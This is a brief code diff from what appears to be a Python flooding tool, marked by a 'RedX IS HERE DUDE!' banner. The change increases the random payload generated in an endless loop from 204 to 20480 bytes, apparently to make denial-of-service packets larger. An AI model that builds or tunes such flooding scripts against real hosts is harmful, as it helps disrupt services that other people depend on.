@@ -45,7 +45,7 @@ def run():
            print(" [!] RedX IS HERE DUDE! ")
 
 def run2():
-    data = random._urandom(204)
+    data = random._urandom(20480)
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
